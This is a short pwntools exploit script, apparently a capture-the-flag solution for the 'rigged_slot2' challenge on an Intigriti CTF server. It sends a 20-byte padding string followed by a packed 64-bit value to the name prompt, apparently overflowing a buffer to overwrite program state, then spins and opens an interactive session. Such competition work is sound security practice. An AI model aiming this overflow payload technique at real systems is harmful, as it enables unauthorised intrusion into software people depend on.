import sys
sys.path.append('/home/ubuntu/pat/scripts/')
from pwn import *
from pwnfast import Pwn

context.terminal = ['tmux', 'splitw', '-v', '-p', '90']

PROG = './rigged_slot2'

### ------------------ EXPLOIT ------------------ ###

r = Pwn(PROG, conn='riggedslot2.ctf.intigriti.io 1337')

pay = b'A' * 20
pay += p64(0x14684c + 1)
r.sla(b'name:', pay)
r.sla(b'spin): ', b'1')

r.interactive()